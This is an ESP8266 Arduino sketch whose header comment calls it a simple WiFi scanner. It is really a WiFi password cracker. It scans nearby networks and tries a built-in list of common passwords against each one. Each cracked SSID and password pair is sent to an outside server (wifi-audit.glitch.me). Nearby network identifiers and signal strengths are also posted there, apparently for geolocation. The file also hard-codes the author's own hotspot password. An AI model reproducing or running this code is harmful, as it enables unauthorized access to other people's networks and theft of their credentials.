/*
    This sketch demonstrates how to scan WiFi networks.
    The API is almost the same as with the WiFi Shield library,
    the most obvious difference being the different file you need to include:
*/
#include "ESP8266WiFi.h"
#include <ESP8266HTTPClient.h>
#define MAXNET 30

int redLED = 14;
int yelLED = 13;
int greLED = 12;
int button = 5;

char *pass[] = {"",
"biddy888",
"34tingisnice",
"123456",
"123456789",
"qwerty",
"12345678",
"111111",
"1234567890",
"1234567",
"password",
"123123",
//"987654321",
//"qwertyuiop",
//"mynoob",
//"123321",
//"666666",
//"18atcskd2w",
//"7777777",
//"1q2w3e4r",
//"654321",
//"555555",
//"3rjs1la7qe",
//"google",
//"1q2w3e4r5t",
//"123qwe",
//"zxcvbnm",
//"1q2w3e",
//"zxcvbnm",
//"admin",
//"1q2w3e",
//"Admin@321",
//"password1",
//"test",
//"football",
//"iloveyou",
//"welcome",
//"monkey",
//"login",
//"abc123",
//"starwars",
//"123123",
//"dragon",
//"passw0rd",
//"hello",
//"freedom",
//"whatever",
//"qazwsx",
//"trustno1",
//"user",
//"friend",
//"love",
//"username",
//"test",
//"hockey",
//"dallas",
//"password",
//"fuckyouasshole",
//"admin123",
//"pussy",
//"asdf",
//"william",
//"soccer",
//"london",
//"1q2w3e",
//"1992",
//"biteme",
//"maggie",
//"querty",
//"rangers",
//"charlie",
//"martin",
//"ginger",
//"yankees",
//"thunder",
//"Michelle",
//"aaaaaa",
//"963258741",
//"fuckyou",
//"nicole",
//"hunter",
//"sunshine",
//"tigger",
//"1989",
//"merlin",
//"ranger 83",
//"solo",
//"banana",
//"chelsea",
//"summer",
//"1990",
//"1991",
//"phoenix",
//"amanda",
//"cookie",
//"ashley",
//"bandit",
//"killer",
//"meandyou",
//"pepper",
//"jessica",
//"zaq1zaq1",
//"jennifer",
"END"};

void setup() {
  Serial.begin(115200);

  // Set WiFi to station mode and disconnect from an AP if it was previously connected
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  pinMode(button, INPUT);
  pinMode(redLED, OUTPUT);
  pinMode(yelLED, OUTPUT);
  pinMode(greLED, OUTPUT);

//connectToPhone();
  
  Serial.println("Setup done");
}


 void connectToPhone(){
    int t = millis();

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    WiFi.begin("iPhone (2)", "biddy888");
    
    while(true) {    
      if(WiFi.status() == WL_CONNECTED){
        Serial.print("Connected!");
        break;
        }
      blinkRED();
      Serial.print(".");
    }
  }



void blinkRED(){
  digitalWrite(redLED, HIGH);
  delay(88);
  digitalWrite(redLED, LOW);
  
  }

void blinkYELLOW(){
  digitalWrite(yelLED, HIGH);
  delay(66);
  digitalWrite(yelLED, LOW);
  delay(20);
  
  }

void blinkGREEN(){
  digitalWrite(greLED, HIGH);
  delay(88);
  digitalWrite(greLED, LOW);
  
  }

String urlencode(String str)
{
    String encodedString="";
    char c;
    char code0;
    char code1;
    char code2;
    for (int i =0; i < str.length(); i++){
      c=str.charAt(i);
      if (c == ' '){
        encodedString+= '+';
      } else if (isalnum(c)){
        encodedString+=c;
      } else{
        code1=(c & 0xf)+'0';
        if ((c & 0xf) >9){
            code1=(c & 0xf) - 10 + 'A';
        }
        c=(c>>4)&0xf;
        code0=c+'0';
        if (c > 9){
            code0=c - 10 + 'A';
        }
        code2='\0';
        encodedString+='%';
        encodedString+=code0;
        encodedString+=code1;
        //encodedString+=code2;
      }
      yield();
    }
    return encodedString;
    
}

int contains(char *found[], char *check, int num){
  for(int i = 0; i < num; i++){
    if(!strcmp(found[i],check)){
      return true;
      }
    }
    return false;
  }

void printArr(char **pArr, int len){
  for(int i = 0; i< len; i++){
    Serial.print(" ");
    Serial.print(pArr[i]);
    Serial.println(" ");
    }
  }





void brutePass(char *ssid){
  
  int passNum = 0;
  char *foundpass = NULL;
  while(pass[passNum] != "END"){
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    WiFi.begin(ssid, pass[passNum]);
    
    for(int timet = millis(); millis()-timet<8000;) {  
      if(WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL){
        break;
        } 
      if(WiFi.status() == WL_CONNECTED){
        foundpass = pass[passNum];
        break;
        }
      blinkYELLOW();
      Serial.print(".");
  }
  if(foundpass != NULL){
  getAddWifi(ssid, foundpass);
  Serial.println("Found SSID:PASS!!!");
  Serial.print(ssid);
  Serial.print(":");
  Serial.println(foundpass);
  break;
  }

  passNum++;
  Serial.println();
  }
  }

int getAddWifi(char *ssid, char *foundpass){
  connectToPhone();
  
  String host = "wifi-audit.glitch.me";

 WiFiClient client;
  const int httpPort = 80;
  if (!client.connect(host, httpPort)) {
    Serial.println("Connection failed");
    return 0;
  }
  
  // We now create a URI for the request
  String url = "/addWIFI?";
  url += "ssid=";
  url += urlencode(String(ssid));
  url += "&pass=";
  url += urlencode(String(foundpass));
  

  
  
  Serial.print("Requesting URL: ");
  Serial.println(url);
  
  // This will send the request to the server
  client.print(String("GET ") + url + " HTTP/1.1\r\n" +
               "Host: " + host + "\r\n" + 
               "Connection: close\r\n\r\n");

  client.stop();
  WiFi.disconnect();
  return 1;
  }

  

int getNetworks(char **foundNets){
  
  int numFound = 0;
  for(int j = 0; j < 5; j++){
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    if(numFound == 30){return numFound;}
    char *currNet = new char[WiFi.SSID(i).length()+1];
    strcpy(currNet,WiFi.SSID(i).c_str( ));

   // Serial.println(currNet);
   Serial.print("SSID: ");
   Serial.print(WiFi.SSID(i));
   Serial.print("   Enc: ");
   Serial.println(WiFi.encryptionType(i));
    if(!contains(foundNets, currNet , numFound) && WiFi.encryptionType(i) != 255 && WiFi.encryptionType(i) != 7){   
       blinkRED();
       foundNets[numFound] = currNet;
       numFound++;
     }    
   }}
  return numFound;
  }

int getAllNetworkInfo(char **foundNets){
   
  int numFound = 0;
  for(int j = 0; j < 5; j++){
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    if(numFound == 30){return numFound;}

    char *currNet = new char[WiFi.SSID(i).length()+1];
    strcpy(currNet,WiFi.SSID(i).c_str( ));
   // Serial.println(currNet);
    if(!contains(foundNets, currNet , numFound)){   
       blinkRED();
       char *bssid = new char[WiFi.BSSIDstr(i).length()+1];
       strcpy(bssid,WiFi.BSSIDstr(i).c_str( ));
       char *res = new char[WiFi.BSSIDstr(i).length()+2+WiFi.SSID(i).length()+2+5+1];
       int rssi = WiFi.RSSI(i);
       sprintf(res, "%s||%s||%d", currNet, bssid, rssi);
//       Serial.println(res);
       
       foundNets[numFound] = res;
       numFound++;
     }    
   }}
  return numFound;
  }

String netInfoString(){
  char *netInfo[30];
  int totnets = getAllNetworkInfo(netInfo);
  String dat = "";
  for(int i = 0; i < totnets; i++){
    dat += netInfo[i];
    if(i != totnets-1){dat += ",,";}
  }
  return dat;
  }

void apiCall(){
  String dat = netInfoString();
  connectToPhone();
  postCoords(dat);
  delay(500);
  while(!getSuccess()){
    dat = netInfoString();
    postCoords(dat);
    delay(500);
    Serial.write('#');
    }
  
  WiFi.disconnect();
  
  }

int postCoords(String dat){
  String host = "wifi-audit.glitch.me";
 WiFiClient client;
  const int httpPort = 80;
  if (!client.connect(host, httpPort)) {
    Serial.println("Connection failed");
    return 0;
  }
  
  // We now create a URI for the request
    String url = "/getGEO";
    String newDat = "dat=";
    newDat += urlencode(dat);

    String req = String("POST ") + url + " HTTP/1.1\r\n" +
               "Host: " + host + "\r\n" + 
               "Content-Type: application/x-www-form-urlencoded\r\n" + 
               "Content-Length: " + String(newDat.length()) + "\r\n\r\n" + newDat;
  
  Serial.println("");
  Serial.println("POST: ");
  Serial.println(req);
  
  // This will send the request to the server
  client.print(req);

  client.stop();
  }

int getSuccess(){
 String host = "wifi-audit.glitch.me";
 WiFiClient client;
  const int httpPort = 80;
  if (!client.connect(host, httpPort)) {
    Serial.println("Connection failed");
    return 0;
  }
  
  // We now create a URI for the request
    String url = "/success";
    

    String req = String("GET ") + url + " HTTP/1.1\r\n" +
               "Host: " + host + "\r\n" + 
               "Accept: */*\r\n" +
               "Connection: close\r\n";
               
  
//  Serial.println("");
//  Serial.println(req);
  
  // This will send the request to the server
  client.println(req);
  int time_t = millis();
   while (!client.available()) {
    if(millis() - time_t > 5000){
      return 0;
      }
  }

  String resp = client.readString();
  char c = resp.charAt(resp.length()-1); //get value of "success"
  if(c == '1'){
    return 1;
    }
   return 0;
  

  
  }

void testBrute(char *ssid){
  
  int passNum = 0;
  char *foundpass = NULL;
  
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    WiFi.begin(ssid, String(""));
    Serial.print("status: ");
    Serial.println(WiFi.status());
    
    for(int timet = millis(); millis()-timet<30000;) {  
      Serial.print("status: ");
    Serial.println(WiFi.status());
    Serial.println(WiFi.status() == WL_CONNECT_FAILED);
    Serial.println(WiFi.status() == WL_CONNECTED);
    Serial.println(WiFi.status() == WL_DISCONNECTED);
      if(WiFi.status() == WL_CONNECT_FAILED){
        Serial.println(millis()-timet);
        break;
        } 
      if(WiFi.status() == WL_CONNECTED){
        Serial.println(millis()-timet);
        break;
        }
      blinkYELLOW();
      Serial.println(".");
  delay(200);
  }
  WiFi.disconnect();
  }
  
  


void loop() {

if(digitalRead(button) == HIGH){
  blinkRED();
  
      


//char *test = "nyu-media2.4GHz";
//
//testBrute(test);

  
  apiCall();
  
  int time_t = millis();

  while(millis() - time_t < 5000){
    blinkGREEN();
    }
    
  char *foundNets[MAXNET];
  int numFound = getNetworks(foundNets);
  printArr(foundNets, numFound);
  for(int i = 0; i<numFound; i++){
    Serial.println(foundNets[i]);
    brutePass(foundNets[i]);
   }


   //test
//  int res = getAddWifi("user1", "pass1");
//  if(res){Serial.println("Successful");}
//  else{Serial.println("uh oh!");}
  
  }
  delay(10);
}
